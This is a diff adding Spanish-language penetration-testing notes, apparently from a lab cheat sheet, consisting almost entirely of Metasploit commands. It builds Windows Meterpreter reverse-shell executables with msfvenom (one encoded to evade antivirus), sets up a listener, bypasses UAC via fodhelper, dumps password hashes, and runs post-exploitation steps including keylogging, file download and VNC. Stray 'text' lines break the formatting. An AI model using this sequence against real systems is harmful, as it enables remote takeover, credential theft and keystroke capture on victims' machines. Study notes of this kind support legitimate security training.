@@ -940,7 +940,78 @@ _Ejemplo output:_
 ```
 [21][ftp] host: 192.168.1.10 login: admin password: p@ssw0rd
 ```
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86
+-f exe LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe
 
+text
+
+### **Configurar handler:**
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.11
+set LPORT 444
+run
+
+text
+
+### **Post-explotación VNC:**
+En meterpreter:
+sessions -i 1
+sysinfo
+run vnc
+
+text
+
+---
+
+## ⬆️ 5. Escalación de Privilegios
+
+### **Payload con encoding:**
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86
+-e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe
+
+text
+
+### **Bypass UAC:**
+En meterpreter:
+getuid
+run post/windows/gather/smart_hashdump # Fallará sin privilegios
+getsystem -t 1 # Fallará también
+
+background
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.11
+set TARGET 0
+exploit
+
+Nueva sesión con privilegios elevados:
+getuid
+getsystem
+run post/windows/gather/smart_hashdump # Ahora funcionará
+
+text
+
+---
+
+## 🖥️ 6. Hacking Windows 10 - Post-Explotación
+
+### **Comandos Meterpreter útiles:**
+sysinfo
+ipconfig
+getuid
+pwd
+ls
+timestomp secret.txt -v # Ver atributos MACE
+cd C:
+download bootmgr
+search -f pagefile.sys
+keyscan_start
+keyscan_dump
+idletime
+shutdown
 **Descargar archivo desde FTP:**
 ```bash
 get archivo.txt
